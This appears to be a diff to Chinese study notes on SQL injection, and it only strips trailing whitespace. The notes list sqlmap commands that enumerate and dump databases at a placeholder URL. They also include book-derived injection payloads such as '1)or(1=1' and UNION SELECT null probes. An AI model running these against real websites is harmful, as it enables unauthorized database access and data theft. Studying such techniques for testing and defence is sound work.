@@ -18,13 +18,13 @@
 [sqlmap手册](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-zh-CN.md)
 
 # sqlmap步骤
-//查数据库 
-1、sqlmap -u http://www.xxx.com --dbs 
-//查数据库表 
-2、sqlmap -u http://www.xxx.com -D 数据库名 --tables 
-//查数据库表字段 
-3、sqlmap -u http://www.xxx.com -D 数据库名 -T 表名 --columns 
-//查数据库字段内容 
+//查数据库
+1、sqlmap -u http://www.xxx.com --dbs
+//查数据库表
+2、sqlmap -u http://www.xxx.com -D 数据库名 --tables
+//查数据库表字段
+3、sqlmap -u http://www.xxx.com -D 数据库名 -T 表名 --columns
+//查数据库字段内容
 4、sqlmap -u http://www.xxx.com -D 数据库名 -T 表名 -C 字段名1，字段名2，字段名3 --dump
 
 sql注入攻击与防御 书笔记
@@ -52,7 +52,7 @@ sql注入攻击与防御 书笔记
 		1 or 1=1 	>	1)or (1=1
 		value or 1=2 	>	value)or(1=2
 		1 and 1=2 	>	1)and(1=2
-		1 or 'ab'='a'+'b'	>	1)or('ab'='a'+'b'	
+		1 or 'ab'='a'+'b'	>	1)or('ab'='a'+'b'
 		1 or 'ab'='a' 'b'	>	1)or('ab'='a' 'b'
 		1 or 'ab'='a'||'b'>	1)or('ab'='a'||'b'
 	2.33终止式sql注入
@@ -74,9 +74,9 @@ sql注入攻击与防御 书笔记
 		4.3.2 盲跟踪P112
 	4.4 匹配列
 		4.4.1
-			?id=12 union select null,null-- 
+			?id=12 union select null,null--
 			?id=12 order by 1/2/3...
 		4.4.2 匹配数据类型P115
 	4.5 使用条件语句P120
-sql注入攻击和防御 
+sql注入攻击和防御
 	2.5身份验证中常用特征值P64
